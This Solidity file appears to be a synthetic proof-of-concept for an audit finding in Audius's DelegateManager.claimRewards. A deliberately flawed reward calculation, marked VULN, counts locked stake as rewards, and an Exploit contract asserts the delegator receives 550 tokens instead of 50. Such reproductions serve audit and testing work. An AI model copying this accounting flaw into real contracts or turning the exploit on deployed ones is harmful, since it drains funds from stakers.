// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Audius DelegateManager.claimRewards — totalRewards includes a pending
    decrease-stake (OpenZeppelin H05, finding 11316).
    SYNTHETIC, cheatcode-free. SP locked 1000, unlocked 1000, delegator 1000.
    processClaim mints 100. totalRewards = staking - outside = 1100, not 100.
    The delegator is credited 550. A fair totalRewards of 100 credits 50. */

library SafeMath11316 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

contract Audio {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract DelegateManager {
    using SafeMath11316 for uint256;

    uint256 public constant LOCKED = 1000 ether;
    uint256 public constant UNLOCKED = 1000 ether;
    uint256 public constant DELEGATED = 1000 ether;
    uint256 public constant FAIR_REWARDS = 100 ether;

    Audio public token;
    address public delegator;
    uint256 public totalRewards;
    uint256 public delegatorCredit;
    uint256 public fairDelegatorCredit;

    constructor(Audio _token, address _delegator) {
        token = _token;
        delegator = _delegator;
    }

    function _processClaim() internal {
        token.mint(address(this), FAIR_REWARDS);
    }

    function _validateClaimRewards()
        internal
        returns (uint256 totalBalanceInStaking, uint256 totalBalanceInSPFactory, uint256 totalBalanceOutsideStaking)
    {
        uint256 spLockedStake = LOCKED;
        _processClaim();
        uint256 _totalBalanceInStaking = token.balanceOf(address(this));
        uint256 _totalBalanceInSPFactory = UNLOCKED.add(spLockedStake);
        _totalBalanceInSPFactory = _totalBalanceInSPFactory.sub(spLockedStake);
        uint256 _totalBalanceOutsideStaking = _totalBalanceInSPFactory.add(DELEGATED);
        return (_totalBalanceInStaking, _totalBalanceInSPFactory, _totalBalanceOutsideStaking);
    }

    function claimRewards() external {
        (
            uint256 totalBalanceInStaking,
            uint256 totalBalanceInSPFactory,
            uint256 totalBalanceOutsideStaking
        ) = _validateClaimRewards();
        // @> VULN: totalRewards is locked stake plus minted rewards, not the minted rewards alone
        uint256 _totalRewards = totalBalanceInStaking.sub(totalBalanceOutsideStaking);
        totalRewards = _totalRewards;
        uint256 totalActiveFunds = totalBalanceOutsideStaking;
        uint256 delegateStakeToSP = DELEGATED;
        uint256 rewardsPriorToSPCut = (delegateStakeToSP.mul(_totalRewards)).div(totalActiveFunds);
        delegatorCredit = rewardsPriorToSPCut;
        fairDelegatorCredit = (delegateStakeToSP.mul(FAIR_REWARDS)).div(totalActiveFunds);
        uint256 spRewardShare = (totalBalanceInSPFactory.mul(_totalRewards)).div(totalActiveFunds);
        spRewardShare;
        token.transfer(delegator, rewardsPriorToSPCut);
    }
}

contract Exploit {
    Audio public token;
    DelegateManager public mgr;

    constructor() {
        token = new Audio();
        mgr = new DelegateManager(token, address(this));
        token.mint(address(mgr), 3000 ether);
    }

    function run() external {
        mgr.claimRewards();
        require(mgr.totalRewards() == 1100 ether, "paid basis 1100");
        require(mgr.FAIR_REWARDS() == 100 ether, "fair 100");
        require(mgr.delegatorCredit() == 550 ether, "delegator paid 550");
        require(mgr.fairDelegatorCredit() == 50 ether, "fair delegator 50");
        require(token.balanceOf(address(this)) == 550 ether, "received 550");
    }
}
